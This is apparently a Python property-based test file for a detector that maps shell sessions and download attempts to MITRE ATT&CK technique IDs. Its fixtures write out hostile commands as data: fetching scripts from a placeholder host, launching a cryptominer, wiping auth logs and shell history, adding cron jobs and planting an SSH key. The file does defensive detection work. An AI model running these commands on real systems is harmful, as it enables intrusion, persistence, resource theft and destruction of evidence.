"""Property tests for content-based ATT&CK techniques (Requirements 4.3-4.9)."""

from __future__ import annotations

import json
from datetime import UTC, datetime

from hypothesis import given
from hypothesis import strategies as st

from brain.analysis.attack_map import map_techniques
from brain.models import Event

CONTENT_IDS = (
    "T1082",
    "T1105",
    "T1059.004",
    "T1053.003",
    "T1496",
    "T1070.004",
    "T1098.004",
)

_T0 = datetime(2024, 1, 1, tzinfo=UTC)

# (kind, payload, content techniques that Event must trigger)
_TEMPLATES: list[tuple[str, dict[str, object], frozenset[str]]] = [
    ("command", {"command": "ls -la"}, frozenset({"T1059.004"})),
    ("command", {"command": "cd /tmp"}, frozenset({"T1059.004"})),
    ("command", {"command": "uname -a"}, frozenset({"T1059.004", "T1082"})),
    ("command", {"command": "cat /proc/cpuinfo"}, frozenset({"T1059.004", "T1082"})),
    ("command", {"command": "whoami"}, frozenset({"T1059.004", "T1082"})),
    ("command", {"command": "wget http://x.example/a.sh"}, frozenset({"T1059.004", "T1105"})),
    ("command", {"command": "curl http://x.example/a"}, frozenset({"T1059.004", "T1105"})),
    ("download_attempt", {"url": "http://x.example/b.bin"}, frozenset({"T1105"})),
    ("command", {"command": "crontab -l"}, frozenset({"T1059.004", "T1053.003"})),
    (
        "command",
        {"command": "echo x >> /etc/cron.d/job"},
        frozenset({"T1059.004", "T1053.003"}),
    ),
    ("command", {"command": "./xmrig -o pool.example:3333"}, frozenset({"T1059.004", "T1496"})),
    ("command", {"command": "nc 10.0.0.1:4444"}, frozenset({"T1059.004", "T1496"})),
    (
        "download_attempt",
        {"url": "tcp://pool.example:5555/"},
        frozenset({"T1105", "T1496"}),
    ),
    (
        "command",
        {"command": "rm -rf /var/log/auth.log"},
        frozenset({"T1059.004", "T1070.004"}),
    ),
    ("command", {"command": "history -c"}, frozenset({"T1059.004", "T1070.004"})),
    (
        "command",
        {"command": "cat /dev/null > ~/.bash_history"},
        frozenset({"T1059.004", "T1070.004"}),
    ),
    (
        "command",
        {"command": "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys"},
        frozenset({"T1059.004", "T1098.004"}),
    ),
    # Non-qualifying Events: mention trigger words but are not commands/downloads.
    ("response", {"data": "uname wget crontab xmrig authorized_keys"}, frozenset()),
    ("login_attempt", {"username": "root", "password": "x", "success": False}, frozenset()),
    ("login_attempt", {"username": "root", "password": "x", "success": True}, frozenset()),
    ("session_start", {}, frozenset()),
]


def _event(kind: str, payload: dict[str, object], n: int) -> Event:
    return Event(
        id=n,
        session_id="s1",
        timestamp=_T0,
        kind=kind,
        payload=json.dumps(payload),
        generated_by="scripted",
    )


@given(st.lists(st.sampled_from(_TEMPLATES), max_size=15))
def test_property_7_content_techniques_iff_trigger_first_evidence(
    chosen: list[tuple[str, dict[str, object], frozenset[str]]],
) -> None:
    """Feature: brain, Property 7: content techniques attached iff trigger matches.

    **Validates: Requirements 4.3, 4.4, 4.5, 4.6, 4.7, 4.8, 4.9**
    """
    events = [_event(k, p, i) for i, (k, p, _) in enumerate(chosen)]
    hits = {h.attack_id: h for h in map_techniques(events) if h.attack_id in CONTENT_IDS}

    for attack_id in CONTENT_IDS:
        expected = next((i for i, (_, _, t) in enumerate(chosen) if attack_id in t), None)
        if expected is None:
            assert attack_id not in hits
        else:
            assert attack_id in hits
            assert hits[attack_id].evidence_event_index == expected


def test_property_7_empty_sequence_has_no_content_techniques() -> None:
    """Feature: brain, Property 7: empty input attaches nothing.

    **Validates: Requirements 4.3-4.9**
    """
    assert map_techniques([]) == []
